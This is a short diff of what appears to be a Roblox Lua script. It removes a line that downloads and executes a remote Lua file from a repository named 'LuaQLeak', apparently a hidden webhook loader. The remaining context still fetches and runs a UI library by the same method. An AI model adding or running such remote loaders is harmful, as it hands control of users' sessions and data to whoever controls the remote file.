@@ -41,8 +41,6 @@ function SendMessage(Message, Botname)
 
 	return Data or nil;
 end
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
